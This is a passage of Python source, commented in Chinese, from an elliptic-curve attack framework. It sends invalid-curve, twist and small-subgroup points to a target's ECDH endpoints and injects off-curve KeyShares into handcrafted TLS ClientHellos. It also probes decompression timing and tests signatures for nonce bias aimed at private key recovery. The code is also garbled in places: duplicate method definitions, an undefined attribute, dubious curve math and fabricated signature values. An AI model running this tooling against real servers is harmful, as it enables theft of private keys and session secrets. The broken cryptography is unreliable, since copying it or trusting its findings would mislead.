            idx = 1
            def read_len(i: int) -> Tuple[int, int]:
                if data[i] < 0x80:
                    return int(data[i]), i + 1
                nbytes = int(data[i] & 0x7F)
                if nbytes == 0 or nbytes > 4:
                    raise ValueError('invalid length')
                if i + 1 + nbytes > len(data):
                    raise ValueError('truncated')
                val = 0
                for j in range(nbytes):
                    val = (val << 8) | int(data[i + 1 + j])
                return val, i + 1 + nbytes
            seq_len, idx = read_len(idx)
            if idx + seq_len > len(data):
                return None, None
            # INTEGER r
            if data[idx] != 0x02:
                return None, None
            idx += 1
            r_len, idx = read_len(idx)
            r_bytes = bytes(data[idx:idx + r_len])
            idx += r_len
            # 去掉前导零
            while len(r_bytes) > 0 and r_bytes[0] == 0x00:
                r_bytes = r_bytes[1:]
            r = int.from_bytes(r_bytes or b"\x00", 'big')
            # INTEGER s
            if data[idx] != 0x02:
                return None, None
            idx += 1
            s_len, idx = read_len(idx)
            s_bytes = bytes(data[idx:idx + s_len])
            # 去掉前导零
            while len(s_bytes) > 0 and s_bytes[0] == 0x00:
                s_bytes = s_bytes[1:]
            s = int.from_bytes(s_bytes or b"\x00", 'big')
            return r, s
        except Exception:
            return None, None
    
    def _extract_jwt_from_response(self, response_text: str) -> str:
        """从响应中提取JWT令牌"""
        try:
            import re
            # 查找JWT模式 (header.payload.signature)
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            matches = re.findall(jwt_pattern, response_text)
            return matches[0] if matches else None
        except Exception:
            return None
    
    def _extract_ecdsa_from_jwt(self, jwt_token: str) -> Tuple[bytes, bytes, bytes]:
        """从JWT中提取 ECDSA 签名（P1363 r||s），仅支持 ES 家族，自动补位解码。"""
        try:
            import base64
            import json
            parts = jwt_token.split('.')
            if len(parts) != 3:
                return None
            header_b64, payload_b64, signature_b64 = parts
            # 解码头部检查算法
            pad = lambda s: s + '=' * (-len(s) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
            alg = header.get('alg', '')
            if not alg.startswith('ES'):
                return None
            sig_bytes = base64.urlsafe_b64decode(pad(signature_b64))
            # 依据曲线字节数切分（默认按 P-256 处理）
            if len(sig_bytes) not in (64, 96, 132):
                return None
            bl = {64: 32, 96: 48, 132: 66}[len(sig_bytes)]
            r = sig_bytes[:bl]
            s = sig_bytes[bl:bl*2]
            signed_data = f"{header_b64}.{payload_b64}".encode()
            # 统一用 SHA-256 计算消息摘要供分析（与 ES256 一致；ES384/521 仅用于来源标注）
            msg_hash = hashlib.sha256(signed_data).digest()
            return r, s, msg_hash
        except Exception:
            return None
    

    

    
    def _extract_signatures_from_response(self, response_text: str, endpoint: str) -> List[Tuple[bytes, bytes, bytes]]:
        """从API响应中提取签名相关数据"""
        signatures = []
        
        try:
            import hashlib
            import re
            import json
            
            # 查找签名相关的头部或JSON字段
            signature_patterns = [
                r'signature["\']?\s*:\s*["\']([A-Za-z0-9+/=]+)["\']',
                r'sig["\']?\s*:\s*["\']([A-Za-z0-9+/=]+)["\']',
                r'X-Signature:\s*([A-Za-z0-9+/=]+)',
                r'Authorization:\s*Signature\s+([A-Za-z0-9+/=]+)'
            ]
            
            for pattern in signature_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    try:
                        import base64
                        sig_bytes = base64.b64decode(match + '===')
                        if len(sig_bytes) >= 32:
                            # 分析可能的r,s结构
                            if len(sig_bytes) >= 64:
                                r = sig_bytes[:32]
                                s = sig_bytes[32:64]
                            else:
                                # 短签名，扩展处理
                                full_hash = hashlib.sha256(sig_bytes).digest()
                                r = full_hash[:16] + b'\x00' * 16
                                s = full_hash[16:] + b'\x00' * 16
                            
                            msg_hash = hashlib.sha256(f"{endpoint}_{match}".encode()).digest()
                            signatures.append((r, s, msg_hash))
                            print(f"[+] Extracted API signature from {endpoint}")
                            
                    except Exception:
                        continue
                        
        except Exception as e:
            print(f"[-] API response signature extraction failed: {e}")
        
        return signatures

# 5. 干活模块
class InvalidCurveAttacker:
    """任务一：ECDSA 非法曲线/异常公钥验证链攻击"""
    
    def __init__(self, target: str, probe_factory: ECProbeFactory):
        self.target = target
        self.probe_factory = probe_factory
        self.results = []
        self.p256 = P256Constants()
        self.p = P256Constants.P
    
    async def run_attack(self) -> List[AttackResult]:
        """执行非法曲线攻击"""
        print(f"[*] Starting Invalid Curve Attack on {self.target}")
        
        # 1. 测试非法曲线点
        invalid_points = self.probe_factory.generate_invalid_curve_point()
        for point in invalid_points:
            result = await self._test_point_validation(point)
            if result.success:
                print(f"    [!] Vulnerable to invalid curve point: {result.vulnerability}")
            self.results.append(result)
        
        # 2. 测试扭曲曲线点
        twist_points = self.probe_factory.generate_twist_curve_point()
        for point in twist_points:
            result = await self._test_twist_attack(point)
            if result.success:
                print(f"    [!] CRITICAL: Twist attack successful!")
            self.results.append(result)
        
        # 3. 测试小子群限制攻击
        small_points = self.probe_factory.generate_small_order_points()
        for point in small_points:
            result = await self._test_small_subgroup(point)
            if result.success:
                print(f"    [!] Small subgroup confinement possible with order {point.order}")
            self.results.append(result)
        
        return self.results
    
    async def _send_ec_request(self, point: ECPoint) -> bytes:
        """发送包含椭圆曲线点的实际请求：优先尝试解压接口"""
        try:
            if point.is_infinity or point.x is None:
                return b"error"
            # 先尝试压缩点解压
            compressed = point.to_bytes(compressed=True)
            sock = socket.socket()
            sock.settimeout(2.0)
            sock.connect((self.target, 443))
            request = (
                f"POST /api/ec/decompress HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: {len(compressed)}\r\n\r\n"
            ).encode()
            sock.send(request + compressed)
            resp = sock.recv(4096)
            sock.close()
            return resp
        except Exception:
            return b"error"
    
    async def _send_ecdh_exchange(self, point: ECPoint) -> bytes:
        """发送ECDH密钥交换请求（真实 HTTP API）"""
        try:
            if point.x is None or point.y is None:
                return b"error"
            sock = socket.socket()
            sock.settimeout(2.0)
            sock.connect((self.target, 443))
            point_bytes = b"\x04" + point.x.to_bytes(32, 'big') + point.y.to_bytes(32, 'big')
            request = (
                f"POST /api/ecdh/exchange HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: {len(point_bytes)}\r\n\r\n"
            ).encode()
            sock.send(request + point_bytes)
            response = sock.recv(4096)
            sock.close()
            if b"shared_secret" in response:
                return response.split(b"shared_secret: ")[1][:32]
            return response[:32]
        except Exception:
            return b"error"
    
    async def _test_point_validation(self, point: ECPoint) -> AttackResult:
        """测试点验证"""
        start = time.time()
        
        try:
            # 发送包含非法点的请求
            response = await self._send_ec_request(point)
            
            # 分析响应
            if b"invalid" not in response.lower() and b"error" not in response.lower():
                # 没有拒绝，可能存在漏洞
                return AttackResult(
                    attack_type=AttackType.INVALID_CURVE,
                    success=True,
                    vulnerability="Missing curve point validation",
                    evidence={"point": point.__dict__, "response": response[:200]},
                    timing_ms=(time.time() - start) * 1000,
                    confidence=0.8,
                    severity="HIGH",
                    recommendation="Implement proper on-curve validation for all EC points"
                )
        except Exception as e:
            pass
        
        return AttackResult(
            attack_type=AttackType.INVALID_CURVE,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
    
    async def _test_twist_attack(self, point: ECPoint) -> AttackResult:
        """测试扭曲曲线攻击"""
        start = time.time()
        
        try:
            # 尝试ECDH密钥交换
            responses = []
            for _ in range(3):
                response = await self._send_ecdh_exchange(point)
                responses.append(response)
            
            # 如果得到一致的共享密钥，说明接受了扭曲曲线点
            if len(set(responses)) == 1 and responses[0] != b"error":
                return AttackResult(
                    attack_type=AttackType.TWIST_ATTACK,
                    success=True,
                    vulnerability="Accepts twist curve points - private key recovery possible!",
                    evidence={"twist_point": point.__dict__, "shared_secret": responses[0].hex()},
                    timing_ms=(time.time() - start) * 1000,
                    confidence=0.95,
                    severity="CRITICAL",
                    recommendation="Validate all points are on the correct curve, not twist"
                )
        except:
            pass
        
        return AttackResult(
            attack_type=AttackType.TWIST_ATTACK,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
    
    async def _test_small_subgroup(self, point: ECPoint) -> AttackResult:
        """测试小子群限制攻击"""
        start = time.time()
        
        try:
            # 跳过无穷远点或不完整坐标（不进行本地伪造）
            if point.is_infinity or point.x is None or point.y is None:
                return AttackResult(
                    attack_type=AttackType.SMALL_SUBGROUP,
                    success=False,
                    timing_ms=(time.time() - start) * 1000,
                    recommendation="No real small-order point available on P-256; consider testing on twist points"
                )
            
            # 1. 发送多轮ECDH交换，每轮使用点的倍数
            shared_secrets = []
            
            for i in range(1, 8):  # 测试小阶数2,3,5,7
                # 计算 i*point
                multiplied_point = self._scalar_mult_point(point, i)
                
                # 发送ECDH请求
                response = await self._send_ecdh_exchange(multiplied_point)
                shared_secrets.append(response)
                
                # 如果共享密钥开始重复，说明进入了小子群
                if i > 1 and response == shared_secrets[0] and response not in (b"", b"error", None):
                    return AttackResult(
                        attack_type=AttackType.SMALL_SUBGROUP,
                        success=True,
                        vulnerability=f"Point confined to subgroup of order {i} - DH key predictable!",
                        evidence={
                            "subgroup_order": i,
                            "repeated_secret": response.hex() if response else None,
                            "point_order_test": [s.hex() if isinstance(s, (bytes, bytearray)) else str(s) for s in shared_secrets]
                        },
                        timing_ms=(time.time() - start) * 1000,
                        confidence=0.9,
                        severity="CRITICAL",
                        recommendation="Check point order equals curve order (cofactor validation)"
                    )
            
            # 2. 测试特殊的低阶点攻击
            # 发送阶为2的点 (x, 0) 
            if point.y == 0:
                zero_responses = []
                for _ in range(3):
                    resp = await self._send_ecdh_exchange(point)
                    zero_responses.append(resp)
                
                if zero_responses and all(r == zero_responses[0] for r in zero_responses) and zero_responses[0] not in (b"", b"error", None):
                    return AttackResult(
                        attack_type=AttackType.SMALL_SUBGROUP,
                        success=True,
                        vulnerability="Accepts order-2 point - trivial subgroup confinement!",
                        evidence={"order_2_point": True, "responses": [r.hex() for r in zero_responses if isinstance(r, (bytes, bytearray))]},
                        timing_ms=(time.time() - start) * 1000,
                        confidence=1.0,
                        severity="CRITICAL"
                    )
            
        except Exception as e:
            pass
        
        return AttackResult(
            attack_type=AttackType.SMALL_SUBGROUP,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
    
    async def _test_compression_fault(self, point: ECPoint) -> AttackResult:
        """测试压缩点故障注入攻击"""
        start = time.time()
        
        try:
            # 1. 发送压缩格式的点，测量解压时间
            compressed_timings = []
            
            for _ in range(10):
                # 构造压缩点 (只有x坐标和奇偶标志)
                compressed = self._compress_point(point)
                
                # 测量解压缩时间
                decompress_start = time.perf_counter_ns()
                response = await self._send_compressed_point(compressed)
                decompress_time = time.perf_counter_ns() - decompress_start
                
                compressed_timings.append(decompress_time)
            
            # 2. 发送特殊构造的"坏"压缩点，触发Tonelli-Shanks边界
            fault_points = [
                # 非二次剩余的x坐标
                self._generate_non_quadratic_residue(),
                # 接近p的x坐标
                self._generate_near_modulus_point(),
                # 特殊模式的x (全0, 全1等)
                bytes([0x00] * 32),
                bytes([0xFF] * 32),
                bytes([0xAA] * 32),  # 10101010 pattern
            ]
            
            fault_timings = []
            fault_responses = []
            
            for fault_x in fault_points:
                fault_start = time.perf_counter_ns()
                response = await self._send_compressed_point(b'\x02' + fault_x)  # 假装是偶y
                fault_time = time.perf_counter_ns() - fault_start
                
                fault_timings.append(fault_time)
                fault_responses.append(response)
                
                # 检测异常时序 (比正常解压慢10倍以上)
                if fault_time > np.mean(compressed_timings) * 10:
                    return AttackResult(
                        attack_type=AttackType.COMPRESSION_FAULT,
                        success=True,
                        vulnerability="Decompression timing leak - Tonelli-Shanks vulnerable!",
                        evidence={
                            "normal_timing_ns": np.mean(compressed_timings),
                            "fault_timing_ns": fault_time,
                            "timing_ratio": fault_time / np.mean(compressed_timings),
                            "fault_x": fault_x.hex()
                        },
                        timing_ms=(time.time() - start) * 1000,
                        confidence=0.85,
                        severity="HIGH",
                        recommendation="Use constant-time square root or reject compressed points"
                    )
            
            # 3. 统计分析时序方差
            variance_ratio = np.var(fault_timings) / np.var(compressed_timings)
            if variance_ratio > 100:  # 故障点的时序方差远大于正常点
                return AttackResult(
                    attack_type=AttackType.COMPRESSION_FAULT,
                    success=True,
                    vulnerability="High timing variance in decompression - side channel leak!",
                    evidence={
                        "normal_variance": np.var(compressed_timings),
                        "fault_variance": np.var(fault_timings),
                        "variance_ratio": variance_ratio
                    },
                    timing_ms=(time.time() - start) * 1000,
                    confidence=0.75,
                    severity="MEDIUM"
                )
                
        except Exception as e:
            pass
        
        return AttackResult(
            attack_type=AttackType.COMPRESSION_FAULT,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
    
    async def _test_lattice_attack(self, signatures: List[Tuple[bytes, bytes, bytes]]) -> AttackResult:
        """测试格基规约攻击 (检测nonce偏差)"""
        start = time.time()
        
        try:
            # 1. 分析nonce的统计特征
            nonce_msbs = []
            nonce_lsbs = []
            
            for sig_r, sig_s, msg_hash in signatures:
                # 从签名的r值推断nonce的某些比特
                r_int = int.from_bytes(sig_r, 'big')
                
                # 检查MSB偏差 (最高位)
                msb_bias = (r_int >> 255) & 0x1
                nonce_msbs.append(msb_bias)
                
                # 检查LSB模式 (最低位)
                lsb_pattern = r_int & 0xFF
                nonce_lsbs.append(lsb_pattern)
            
            # 2. 检测偏差
            msb_bias_ratio = sum(nonce_msbs) / len(nonce_msbs)
            lsb_entropy = len(set(nonce_lsbs)) / len(nonce_lsbs)
            
            # 如果MSB明显偏向0或1 (应该是0.5)
            if abs(msb_bias_ratio - 0.5) > 0.1:
                leaked_bits = -np.log2(abs(msb_bias_ratio - 0.5))
                
                return AttackResult(
                    attack_type=AttackType.LATTICE_ATTACK,
                    success=True,
                    vulnerability=f"Nonce MSB bias detected - {leaked_bits:.1f} bits leaked per signature!",
                    evidence={
                        "msb_bias": msb_bias_ratio,
                        "signatures_analyzed": len(signatures),
                        "estimated_leaked_bits": leaked_bits,
                        "required_signatures_for_key_recovery": int(256 / leaked_bits)
                    },
                    timing_ms=(time.time() - start) * 1000,
                    confidence=0.8,
                    severity="CRITICAL",
                    recommendation="Use deterministic nonce (RFC 6979) or ensure full entropy"
                )
            
            # 如果LSB熵太低 (重复模式)
            if lsb_entropy < 0.5:
                return AttackResult(
                    attack_type=AttackType.LATTICE_ATTACK,
                    success=True,
                    vulnerability=f"Nonce LSB patterns detected - entropy only {lsb_entropy:.2f}!",
                    evidence={
                        "lsb_entropy": lsb_entropy,
                        "unique_patterns": len(set(nonce_lsbs)),
                        "total_signatures": len(signatures)
                    },
                    timing_ms=(time.time() - start) * 1000,
                    confidence=0.7,
                    severity="HIGH"
                )
            
            # 3. 快速统计分析替代LLL - 专注发现而非利用
            if len(signatures) >= 10:  # 降低最小要求
                # 卡方检验nonce分布均匀性
                chi_squared_p_value = self._chi_squared_test([int.from_bytes(sig_r, 'big') for sig_r, _, _ in signatures])
                
                # 检测r值重复（直接私钥泄露）
                r_repeats = self._detect_r_value_repeats(signatures)
                
                # 分析连续r值差分
                r_diff_analysis = self._analyze_consecutive_r_diff([int.from_bytes(sig_r, 'big') for sig_r, _, _ in signatures])
                
                # 综合判断是否存在可利用的偏差
                vulnerability_score = 0
                evidence = {}
                
                if chi_squared_p_value < 0.01:  # 分布显著非均匀
                    vulnerability_score += 3
                    evidence["chi_squared_p_value"] = chi_squared_p_value
                    evidence["distribution_analysis"] = "Non-uniform nonce distribution detected"
                
                if r_repeats > 0:  # 发现r值重复
                    vulnerability_score += 5  # 最高分
                    evidence["r_value_repeats"] = r_repeats
                    evidence["direct_key_recovery"] = "Immediate private key recovery possible"
                
                if r_diff_analysis['pattern_strength'] > 0.7:  # 强规律性
                    vulnerability_score += 2
                    evidence["pattern_analysis"] = r_diff_analysis
                
                if vulnerability_score >= 3:
                    return AttackResult(
                        attack_type=AttackType.LATTICE_ATTACK,
                        success=True,
                        vulnerability="CRITICAL: ECDSA Nonce Bias Detected - Private Key Recovery Likely",
                        evidence=evidence,
                        timing_ms=(time.time() - start) * 1000,
                        confidence=min(0.95, vulnerability_score / 5),
                        severity="CRITICAL",
                        recommendation="Use SageMath + fpylll for offline private key recovery"
                    )
                    
        except Exception as e:
            pass
        
        return AttackResult(
            attack_type=AttackType.LATTICE_ATTACK,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
        
    
    def _scalar_mult_point(self, point: ECPoint, scalar: int) -> ECPoint:
        """椭圆曲线标量乘法 - 完整Double-and-Add算法实现"""
        if scalar == 0:
            return ECPoint(None, None, True)  # 无穷远点
        
        if point.is_infinity:
            return ECPoint(None, None, True)
        
        # 处理负标量
        if scalar < 0:
            scalar = -scalar % P256Constants.N
            # 对点取反: (x, -y mod p)
            neg_y = (-point.y) % self.p
            point = ECPoint(point.x, neg_y, False, point.curve_type, point.order)
        
        # 确保标量在有效范围内
        scalar = scalar % P256Constants.N
        
        # Double-and-Add算法实现
        result = ECPoint(None, None, True)  # 无穷远点作为累加器
        addend = ECPoint(point.x, point.y, False, point.curve_type, point.order)
        
        # 处理标量的每一位
        while scalar > 0:
            if scalar & 1:  # 如果当前最低位是1
                result = self._point_add_robust(result, addend)
            
            # 点倍乘
            addend = self._point_double_robust(addend)
            scalar >>= 1
        
        return result
    
    def _point_add_robust(self, p1: ECPoint, p2: ECPoint) -> ECPoint:
        """鲁棒的椭圆曲线点加法 - 处理所有边界情况"""
        # 处理无穷远点
        if p1.is_infinity:
            return ECPoint(p2.x, p2.y, p2.is_infinity, p2.curve_type, p2.order)
        if p2.is_infinity:
            return ECPoint(p1.x, p1.y, p1.is_infinity, p1.curve_type, p1.order)
        
        # 如果两点相同，使用点倍乘
        if p1.x == p2.x and p1.y == p2.y:
            return self._point_double_robust(p1)
        
        # 如果x坐标相同但y坐标相反，结果是无穷远点
        if p1.x == p2.x:
            return ECPoint(None, None, True)
        
        try:
            # 标准点加法公式
            # lambda = (y2 - y1) / (x2 - x1) mod p
            dx = (p2.x - p1.x) % self.p
            dy = (p2.y - p1.y) % self.p
            dx_inv = self._mod_inverse(dx, self.p)
            lambda_val = (dy * dx_inv) % self.p
            
            # x3 = lambda^2 - x1 - x2 mod p
            x3 = (lambda_val * lambda_val - p1.x - p2.x) % self.p
            
            # y3 = lambda * (x1 - x3) - y1 mod p
            y3 = (lambda_val * (p1.x - x3) - p1.y) % self.p
            
            return ECPoint(x3, y3, False, p1.curve_type)
            
        except Exception:
            # 如果计算失败，返回无穷远点
            return ECPoint(None, None, True)
    
    def _point_double_robust(self, point: ECPoint) -> ECPoint:
        """鲁棒的椭圆曲线点倍乘"""
        if point.is_infinity:
            return ECPoint(None, None, True)
        
        if point.y == 0:
            return ECPoint(None, None, True)
        
        try:
            # 点倍乘公式
            # lambda = (3*x^2 + a) / (2*y) mod p
            # 对于P-256，a = -3
            numerator = (3 * point.x * point.x + P256Constants.A) % self.p
            denominator = (2 * point.y) % self.p
            denominator_inv = self._mod_inverse(denominator, self.p)
            lambda_val = (numerator * denominator_inv) % self.p
            
            # x3 = lambda^2 - 2*x mod p
            x3 = (lambda_val * lambda_val - 2 * point.x) % self.p
            
            # y3 = lambda * (x - x3) - y mod p
            y3 = (lambda_val * (point.x - x3) - point.y) % self.p
            
            return ECPoint(x3, y3, False, point.curve_type)
            
        except Exception:
            # 如果计算失败，返回无穷远点
            return ECPoint(None, None, True)
    
    def _compress_point(self, point: ECPoint) -> bytes:
        """压缩椭圆曲线点"""
        prefix = b'\x02' if point.y % 2 == 0 else b'\x03'
        return prefix + point.x.to_bytes(32, 'big')
    
    def _generate_non_quadratic_residue(self) -> bytes:
        """生成非二次剩余"""
        # 已知的P-256非二次剩余
        non_qr = 0x2b4c40b84e2e2c2f2db2e2c2f2db2e2c2f2db2e2c2f2db2e2c2f2db2e2c2f2d
        return non_qr.to_bytes(32, 'big')
    
    def _generate_near_modulus_point(self) -> bytes:
        """生成接近模数的点"""
        return (self.p256.p - random.randint(1, 1000)).to_bytes(32, 'big')
    

    
    def _map_to_twist(self, point: ECPoint) -> ECPoint:
        """映射到扭曲曲线"""
        # P-256的扭曲曲线参数
        twist_factor = 2
        new_x = (point.x * twist_factor) % self.p256.p
        new_y = point.y  # y坐标不变
        return ECPoint(new_x, new_y)
    
    async def _send_compressed_point(self, compressed: bytes) -> bytes:
        """发送压缩点"""
        try:
            sock = socket.socket()
            sock.settimeout(1.0)
            sock.connect((self.target_host, self.target_port))
            
            request = f"POST /api/ec/decompress HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += f"Content-Type: application/octet-stream\r\n"
            request += f"Content-Length: {len(compressed)}\r\n"
            request += "\r\n"
            
            sock.send(request.encode() + compressed)
            response = sock.recv(4096)
            sock.close()
            return response
        except:
            return b"error"
            
    async def _send_ecdh_exchange(self, point: ECPoint) -> bytes:
        """发送ECDH密钥交换请求"""
        try:
            sock = socket.socket()
            sock.settimeout(1.0)
            sock.connect((self.target_host, self.target_port))
            
            # 构造ECDH请求
            point_bytes = b'\x04' + point.x.to_bytes(32, 'big') + point.y.to_bytes(32, 'big')
            
            request = f"POST /api/ecdh/exchange HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += "Content-Type: application/octet-stream\r\n"
            request += f"Content-Length: {len(point_bytes)}\r\n"
            request += "\r\n"
            
            sock.send(request.encode() + point_bytes)
            response = sock.recv(4096)
            sock.close()
            
            # 提取共享密钥
            if b"shared_secret" in response:
                return response.split(b"shared_secret: ")[1][:32]
            return response[:32]
        except:
            return b"error"
    
    async def _trigger_scalar_mult(self, point: ECPoint, scalar: int) -> bytes:
        """触发标量乘法操作"""
        try:
            sock = socket.socket()
            sock.settimeout(1.0)
            sock.connect((self.target_host, self.target_port))
            
            # 构造请求
            data = {
                "point": {
                    "x": point.x.to_bytes(32, 'big').hex(),
                    "y": point.y.to_bytes(32, 'big').hex()
                },
                "scalar": scalar
            }
            
            json_data = json.dumps(data)
            
            request = f"POST /api/ec/scalar_mult HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += "Content-Type: application/json\r\n"
            request += f"Content-Length: {len(json_data)}\r\n"
            request += "\r\n"
            request += json_data
            
            sock.send(request.encode())
            response = sock.recv(4096)
            sock.close()
            return response
        except:
            return b"error"

    # === TLS KeyShare injection helpers (for real TLS ECDH validation) ===
    def _tls_build_client_hello(self, sni: str, keyshare_entries: List[Tuple[int, bytes]]) -> bytes:
        def u8(x):
            return struct.pack('!B', x)
        def u16(x):
            return struct.pack('!H', x)
        def u24(x):
            return struct.pack('!I', x)[1:]
        legacy_version = b"\x03\x03"
        random_bytes = os.urandom(32)
        session_id = os.urandom(32)  # non-empty for compat
        cipher_suites = b"\x13\x01\x13\x02\x13\x03"
        cipher_vec = u16(len(cipher_suites)) + cipher_suites
        comp_methods = b"\x01\x00"
        ext_list = b""
        # server_name (0)
        if sni:
            host_bytes = sni.encode('idna')
            sni_entry = b"\x00" + u16(len(host_bytes)) + host_bytes
            sni_list = u16(len(sni_entry)) + sni_entry
            ext_list += u16(0) + u16(len(sni_list)) + sni_list
        # supported_versions (43) -> 1.3 and 1.2
        versions = b"\x03\x04\x03\x03"
        versions_vec = u8(len(versions)) + versions
        ext_list += u16(43) + u16(len(versions_vec)) + versions_vec
        # supported_groups (10)
        groups = (
            b"\x00\x1d" b"\x00\x1e" b"\x00\x17" b"\x00\x18" b"\x00\x19"
        )
        groups_vec = u16(len(groups)) + groups
        ext_list += u16(10) + u16(len(groups_vec)) + groups_vec
        # signature_algorithms (13) + cert (50)
        sigalgs = (b"\x04\x03" b"\x05\x03" b"\x06\x03" b"\x08\x04" b"\x08\x05" b"\x08\x06" b"\x08\x07" b"\x08\x08")
        sigalgs_vec = u16(len(sigalgs)) + sigalgs
        ext_list += u16(13) + u16(len(sigalgs_vec)) + sigalgs_vec
        ext_list += u16(50) + u16(len(sigalgs_vec)) + sigalgs_vec
        # psk_key_exchange_modes (45)
        modes = b"\x01"
        modes_vec = u8(len(modes)) + modes
        ext_list += u16(45) + u16(len(modes_vec)) + modes_vec
        # key_share (51)
        ks_entries = b""
        for group_id, ke in keyshare_entries:
            ks_entries += u16(group_id) + u16(len(ke)) + ke
        ks_vec = u16(len(ks_entries)) + ks_entries
        ext_list += u16(51) + u16(len(ks_vec)) + ks_vec
        extensions_block = u16(len(ext_list)) + ext_list
        ch_body = (
            legacy_version +
            random_bytes +
            u8(len(session_id)) + session_id +
            cipher_vec +
            comp_methods +
            extensions_block
        )
        ch = b"\x01" + u24(len(ch_body)) + ch_body
        record = b"\x16\x03\x03" + u16(len(ch)) + ch
        return record

    async def _tls_send_clienthello(self, payload: bytes) -> Dict[str, Any]:
        try:
            sock = socket.socket()
            sock.settimeout(self.timeout if hasattr(self, 'timeout') else 5)
            sock.connect((self.target_host, self.target_port))
            sock.send(payload)
            data = sock.recv(8192)
            sock.close()
            resp = {
                'ok': bool(data and len(data) >= 5),
                'content_type': data[0] if data else None,
                'raw': data,
                'request_dump_b64': base64.b64encode(payload).decode(),
                'response_dump_b64': base64.b64encode(data or b'').decode(),
            }
            # parse basic alert
            if data and data[0] == 0x15 and len(data) >= 7:
                resp['alert_level'] = data[5]
                resp['alert_desc'] = data[6]
            return resp
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def _wrap_point_as_keyshare(self, point: ECPoint) -> Tuple[int, bytes]:
        # secp256r1 group id = 0x0017
        x = point.x.to_bytes(32, 'big')
        y = point.y.to_bytes(32, 'big')
        return 0x0017, b"\x04" + x + y

    async def _test_tls_keyshare_injection(self) -> AttackResult:
        """使用 TLS ClientHello 注入扭曲/非法点，验证服务端在曲线/KeyShare校验。"""
        start = time.time()
        try:
            # 1) 扭曲曲线点
            points = self.probe_factory.generate_twist_curve_point()
            for pt in (points if isinstance(points, list) else [points]):
                if not pt or pt.x is None or pt.y is None:
                    continue
                group, ke = self._wrap_point_as_keyshare(pt)
                ch = self._tls_build_client_hello(self.target_host, [(group, ke)])
                resp = await self._tls_send_clienthello(ch)
                if resp.get('ok') and resp.get('content_type') == 0x16:
                    return AttackResult(
                        attack_type=AttackType.TWIST_ATTACK,
                        success=True,
                        vulnerability="TLS accepted twist-curve KeyShare (secp256r1)",
                        evidence={
                            'request_dump_b64': resp.get('request_dump_b64'),
                            'response_dump_b64': resp.get('response_dump_b64')
                        },
                        timing_ms=(time.time() - start) * 1000,
                        confidence=0.95,
                        severity="CRITICAL",
                        recommendation="Enforce on-curve validation before ECDH; reject twist points"
                    )
            # 2) 明确非法点（越界/非二次剩余导致无解）
            invalid_pts = self.probe_factory.generate_invalid_curve_point()
            for ipt in invalid_pts[:3]:
                if not ipt or ipt.x is None or ipt.y is None:
                    continue
                group, ke = self._wrap_point_as_keyshare(ipt)
                ch = self._tls_build_client_hello(self.target_host, [(group, ke)])
                resp = await self._tls_send_clienthello(ch)
                if resp.get('ok') and resp.get('content_type') == 0x16:
                    return AttackResult(
                        attack_type=AttackType.INVALID_CURVE,
                        success=True,
                        vulnerability="TLS accepted off-curve KeyShare (secp256r1)",
                        evidence={
                            'request_dump_b64': resp.get('request_dump_b64'),
                            'response_dump_b64': resp.get('response_dump_b64')
                        },
                        timing_ms=(time.time() - start) * 1000,
                        confidence=0.9,
                        severity="HIGH",
                        recommendation="Validate EC points from KeyShare are on curve; reject invalid coordinates"
                    )
        except Exception:
            pass
        return AttackResult(
            attack_type=AttackType.BASELINE_AUDIT,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
    
    async def _send_pairing_computation(self, point1: ECPoint, point2: ECPoint) -> bytes:
        """发送配对计算请求"""
        try:
            sock = socket.socket()
            sock.settimeout(1.0)
            sock.connect((self.target_host, self.target_port))
            
            # 构造配对请求
            data = {
                "point1": {
                    "x": point1.x.to_bytes(32, 'big').hex(),
                    "y": point1.y.to_bytes(32, 'big').hex()
                },
                "point2": {
                    "x": point2.x.to_bytes(32, 'big').hex(),
                    "y": point2.y.to_bytes(32, 'big').hex()
                }
            }
            
            json_data = json.dumps(data)
            
            request = f"POST /api/ec/pairing HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += "Content-Type: application/json\r\n"
            request += f"Content-Length: {len(json_data)}\r\n"
            request += "\r\n"
            request += json_data
            
            sock.send(request.encode())
            response = sock.recv(4096)
            sock.close()
            return response
        except:
            return b"error"
    
    async def _trigger_blinded_operation(self, point: ECPoint, operation_id: int) -> bytes:
        """触发盲化操作"""
        try:
            sock = socket.socket()
            sock.settimeout(1.0)
            sock.connect((self.target_host, self.target_port))
            
            # 构造盲化操作请求
            point_bytes = b'\x04' + point.x.to_bytes(32, 'big') + point.y.to_bytes(32, 'big')
            
            request = f"POST /api/ec/blinded_op HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += f"X-Operation-ID: {operation_id}\r\n"
            request += "Content-Type: application/octet-stream\r\n"
            request += f"Content-Length: {len(point_bytes)}\r\n"
            request += "\r\n"
            
            sock.send(request.encode() + point_bytes)
            response = sock.recv(4096)
            sock.close()
            return response
        except:
            return b"error"
    
    async def _send_scalar_mult_request(self, point: ECPoint, scalar: int) -> bytes:
        """发送标量乘法请求"""
        return await self._trigger_scalar_mult(point, scalar)
    
    async def _measure_scalar_mult_timing(self, point: ECPoint, scalar: int) -> int:
        """精确测量标量乘法时序"""
        timings = []
        
        # 多次测量取中位数
        for _ in range(5):
            start = time.perf_counter_ns()
            await self._trigger_scalar_mult(point, scalar)
            end = time.perf_counter_ns()
            timings.append(end - start)
        
        return int(np.median(timings))
    
    #  主执行流程 
    
    async def run_comprehensive_audit(self) -> P256AuditReport:
        """运行完整的P-256审计"""
        print(f"\n{'='*60}")
        print(f"P-256 Attack Framework - Comprehensive Audit")
